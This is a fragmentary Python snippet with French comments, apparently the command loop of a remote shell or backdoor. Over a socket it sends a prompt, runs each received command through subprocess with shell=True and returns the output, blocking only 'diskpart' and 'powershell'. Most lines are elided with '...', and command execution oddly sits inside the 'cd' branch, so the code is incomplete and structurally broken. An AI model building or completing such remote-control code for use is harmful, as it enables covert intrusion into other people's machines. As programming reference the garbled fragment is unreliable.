...
def main():
    ...
    try:
        ...
        while True:
            ...
            s.send(f"{current_dir}> ".encode())  # Affiche le "prompt" initial
            ...
            if command.lower() in ["diskpart", "powershell"]:
                s.send(b"Command not supported for security reasons.\n")
                continue
            ...
            if command.startswith("cd "):
                ...
                try:
                    # Exécute la commande et renvoie la sortie
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_dir)
                    s.send(output + f"\n{os.getcwd()}> ".encode())  # Affiche le chemin après exécution
                except Exception as e:
